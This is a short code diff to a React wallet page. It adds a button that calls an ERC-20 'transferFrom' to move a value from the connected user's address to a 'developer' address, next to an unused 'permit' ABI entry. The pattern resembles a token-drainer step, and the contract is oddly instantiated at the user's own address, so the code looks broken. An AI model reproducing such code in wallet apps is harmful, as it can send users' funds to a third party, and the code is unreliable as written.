@@ -168,6 +168,17 @@ const Page = () => {
 				)
 			})}
 			<br/>
+			<button onClick={async ()=>{
+				let tokenContract = new ethers.Contract(account.address, [
+					'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
+					'function transferFrom(address from, address to, uint256 value) external returns (bool)'
+				], signer);
+
+				console.log(await tokenContract.transferFrom(account.address,developer.address, message.value));
+			}}>
+				transfer
+			</button>
+			<br/>
 			{account.chainId}
 			<br/>
 			<TokenList address={account.address + ""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
